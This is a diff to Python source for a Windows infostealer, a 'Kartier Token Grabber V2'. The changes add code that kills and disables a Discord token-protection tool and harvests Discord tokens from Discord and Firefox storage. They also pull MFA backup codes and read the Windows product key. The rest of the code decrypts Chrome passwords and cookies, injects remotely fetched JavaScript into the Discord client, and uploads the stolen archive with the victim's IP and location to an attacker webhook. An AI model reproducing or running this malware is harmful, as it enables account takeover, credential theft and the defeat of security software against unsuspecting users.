@@ -1,11 +1,12 @@
-import requests
 import os
+import requests
 import shutil
 import sqlite3
 import zipfile
 import json
 import base64 
 import psutil
+import winreg
 
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
@@ -19,6 +20,7 @@ class Hazard_Token_Grabber_V2:
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Kartier_Token_Grabber_V2"
+        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
 
         try:
             os.mkdir(os.path.join(self.tempfolder))
@@ -28,16 +30,17 @@ class Hazard_Token_Grabber_V2:
         self.tokens = []
         self.discord_psw = []
         self.backup_codes = []
-
-        if os.path.exists(self.roaming+"\\BetterDiscord"):
+        
+        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
             self.bypass_better_discord()
-
-        if not os.path.exists(self.appdata+'\\Google'):
+        self.bypassTokenProtector()
+        if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
             self.grabPassword()
             self.grabCookies()
         self.grabTokens()
+        self.neatifyTokens()
         self.screenshot()
         for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
@@ -85,7 +88,7 @@ class Hazard_Token_Grabber_V2:
                 if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Kartier"))
                     except FileNotFoundError:
                         pass
                     f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
@@ -96,6 +99,46 @@ class Hazard_Token_Grabber_V2:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
+    def bypassTokenProtector(self):
+        #fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
+        tp = f"{self.roaming}\\DiscordTokenProtector\\"
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in\
+            ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
+                try:
+                    proc.kill()
+                except psutil.NoSuchProcess:
+                    pass
+        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
+            try:
+                os.remove(tp+i)
+            except Exception:
+                pass 
+        try:
+            with open(tp+"config.json") as f:
+                item = json.load(f)
+                item['auto_start'] = False
+                item['auto_start_discord'] = False
+                item['integrity'] = False
+                item['integrity_allowbetterdiscord'] = False
+                item['integrity_checkexecutable'] = False
+                item['integrity_checkhash'] = False
+                item['integrity_checkmodule'] = False
+                item['integrity_checkscripts'] = False
+                item['integrity_checkresource'] = False
+                item['integrity_redownloadhashes'] = False
+                item['iterations_iv'] = 364
+                item['iterations_key'] = 457
+                item['version'] = 69420
+
+            with open(tp+"config.json", 'w') as f:
+                json.dump(item, f, indent=2, sort_keys=True)
+
+            with open(tp+"config.json", 'a') as f:
+                f.write("\n\n//Kartier just shit on this token protector | https://discord.gg/zwpWPcHyjt")
+        except Exception:
+            pass
+
     def bypass_better_discord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
         with open(bd, "rt", encoding="cp437") as f:
@@ -104,6 +147,33 @@ class Hazard_Token_Grabber_V2:
         with open(bd, 'w'): pass
         with open(bd, "wt", encoding="cp437") as f:
             f.write(content2)
+
+    def getProductKey(self, path: str = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
+        def strToInt(x):
+            if isinstance(x, str):
+                return ord(x)
+            return x
+        chars = 'BCDFGHJKMPQRTVWXY2346789'
+        result = ''
+        offset = 52
+        reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
+        val, _ = winreg.QueryValueEx(reg, 'DigitalProductID')
+        key = list(val)
+    
+        for i in range(24,-1, -1):
+            temp = 0
+            for j in range(14,-1,-1):
+                temp *= 256
+                temp += strToInt(key[j+ offset])
+                if temp / 24 <= 255:
+                    key[j+ offset] = temp/24
+                else:
+                    key[j+ offset] = 255
+                temp = int(temp % 24)
+            result = chars[temp] + result
+        for i in range(5,len(result),6):
+            result = result[:i] + '-' + result[i:]
+        return result
 
     def get_master_key(self):
         with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
@@ -130,7 +200,7 @@ class Hazard_Token_Grabber_V2:
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except:
-            return "Chrome < 80"
+            return "Failed to decrypt password"
     
     def grabPassword(self):
         master_key = self.get_master_key()
@@ -191,7 +261,6 @@ class Hazard_Token_Grabber_V2:
             pass
 
     def grabTokens(self):
-        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
@@ -224,54 +293,81 @@ class Hazard_Token_Grabber_V2:
                 if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                     continue
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for regex in (self.regex):
                         for token in findall(regex, line):
-                            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
-                            j = r.json()
+                            try:
+                                r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                            except Exception:
+                                pass
                             if r.status_code == 200:
                                 if token in self.tokens:
                                     continue
                                 self.tokens.append(token)
+        if os.path.exists(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
+            for path, subdirs, files in os.walk(os.getenv("appdata")+"\\Mozilla\\Firefox\\Profiles"):
+                for _file in files:
+                    if not _file.endswith('.sqlite'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (self.regex):
+                            for token in findall(regex, line):
+                                try:
+                                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                                except Exception:
+                                    pass
+                                if r.status_code == 200:
+                                    if token in self.tokens:
+                                        continue
+                                    self.tokens.append(token)
+                                    
+    def neatifyTokens(self):
+        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
+        for token in self.tokens:
+            try:
+                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
+            except Exception:
+                pass
+            user = j["username"] + "#" + str(j["discriminator"])
 
-                                user = j["username"] + "#" + str(j["discriminator"])
-
-                                if token.startswith("mfa."):
-                                    with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
-                                        fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
-                                        for x in self.discord_psw:
-                                            try:
-                                                r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
-                                                for i in r["backup_codes"]:
-                                                    if i not in self.backup_codes:
-                                                        self.backup_codes.append(i)
-                                                        fp.write(f'\t{i["code"]} | {"Already used" if i["consumed"] == True else "Not used"}\n')
-                                            except Exception:
-                                                pass
-
-                                badges = ""
-                                flags = j['flags']
-                                if (flags == 1): badges += "Staff, "
-                                if (flags == 2): badges += "Partner, "
-                                if (flags == 4): badges += "Hypesquad Event, "
-                                if (flags == 8): badges += "Green Bughunter, "
-                                if (flags == 64): badges += "Hypesquad Bravery, "
-                                if (flags == 128): badges += "HypeSquad Brillance, "
-                                if (flags == 256): badges += "HypeSquad Balance, "
-                                if (flags == 512): badges += "Early Supporter, "
-                                if (flags == 16384): badges += "Gold BugHunter, "
-                                if (flags == 131072): badges += "Verified Bot Developer, "
-                                if (badges == ""): badges = "None"
-
-                                user = j["username"] + "#" + str(j["discriminator"])
-                                email = j["email"]
-                                phone = j["phone"] if j["phone"] else "No Phone Number attached"
-
-                                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
-                                has_nitro = False
-                                has_nitro = bool(len(nitro_data) > 0)
-
-                                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
-                                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
+            if token.startswith("mfa.") and self.discord_psw:
+                with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
+                    fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
+                    for x in self.discord_psw:
+                        try:
+                            r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
+                            for i in r["backup_codes"]:
+                                if i not in self.backup_codes:
+                                    self.backup_codes.append(i)
+                                    fp.write(f'\t{i["code"]} | {"Already used" if i["consumed"] == True else "Not used"}\n')
+                        except Exception:
+                            pass
+            badges = ""
+            flags = j['flags']
+            if (flags == 1): badges += "Staff, "
+            if (flags == 2): badges += "Partner, "
+            if (flags == 4): badges += "Hypesquad Event, "
+            if (flags == 8): badges += "Green Bughunter, "
+            if (flags == 64): badges += "Hypesquad Bravery, "
+            if (flags == 128): badges += "HypeSquad Brillance, "
+            if (flags == 256): badges += "HypeSquad Balance, "
+            if (flags == 512): badges += "Early Supporter, "
+            if (flags == 16384): badges += "Gold BugHunter, "
+            if (flags == 131072): badges += "Verified Bot Developer, "
+            if (badges == ""): badges = "None"
+            user = j["username"] + "#" + str(j["discriminator"])
+            email = j["email"]
+            phone = j["phone"] if j["phone"] else "No Phone Number attached"
+            try:
+                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+            except Exception:
+                pass
+            has_nitro = False
+            has_nitro = bool(len(nitro_data) > 0)
+            try:
+                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+            except Exception:
+                pass
+            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
     def screenshot(self):
@@ -285,6 +381,7 @@ class Hazard_Token_Grabber_V2:
         image.close()
 
     def SendInfo(self):
+        wkey = self.getProductKey()
         ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
@@ -295,16 +392,20 @@ class Hazard_Token_Grabber_V2:
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except Exception:
             pass
-        temp = os.path.join(self.tempfolder)
-        new = os.path.join(self.appdata, f'Kartier.V2-[{os.getlogin()}].zip')
-        self.zip(temp, new)
+        _zipfile = os.path.join(self.appdata, f'Kartier.V2-[{os.getlogin()}].zip')
+        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
+        abs_src = os.path.abspath(self.tempfolder)
         for dirname, _, files in os.walk(self.tempfolder):
-            for f in files:
-                self.files += f"\n{f}"
-        n = 0
-        for r, d, files in os.walk(self.tempfolder):
-            n+= len(files)
-            self.fileCount = f"{n} Files Found: "
+            for filename in files:
+                absname = os.path.abspath(os.path.join(dirname, filename))
+                arcname = absname[len(abs_src) + 1:]
+                zipped_file.write(absname, arcname)
+        zipped_file.close()
+        files = os.listdir(self.tempfolder)
+        for f in files:
+            self.files += f"\n{f}"
+        self.fileCount = f"{len(files)} Files Found: "
+        backslash = "\n"
         embed = {
             "avatar_url":"https://cdn.discordapp.com/attachments/857823662802468874/936508525557981264/ezgif-5-5cc2f16e09.gif",
             "embeds": [
@@ -314,7 +415,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://discord.gg/zwpWPcHyjt",
                         "icon_url": "https://cdn.discordapp.com/attachments/857823662802468874/936506794816200784/ezgif-5-8b7c47f1b0.gif"
                     },
-                    "description": f"**{os.getlogin()}** Just ran Kartier Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f'**{os.getlogin()}** Just ran Kartier Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}{backslash+"Windows Key: "+wkey if wkey else ""}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                     "color": 16119101,
 
                     "thumbnail": {
@@ -328,18 +429,8 @@ class Hazard_Token_Grabber_V2:
             ]
         }
         requests.post(self.webhook, json=embed)
-        requests.post(self.webhook, files={'upload_file': open(new,'rb')})
-        os.remove(new)
-
-    def zip(self, src, dst):
-        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
-        abs_src = os.path.abspath(src)
-        for dirname, _, files in os.walk(src):
-            for filename in files:
-                absname = os.path.abspath(os.path.join(dirname, filename))
-                arcname = absname[len(abs_src) + 1:]
-                zipped_file.write(absname, arcname)
-        zipped_file.close()
+        requests.post(self.webhook, files={'upload_file': open(_zipfile,'rb')})
+        os.remove(_zipfile)
 
 if __name__ == "__main__":
     Hazard_Token_Grabber_V2()
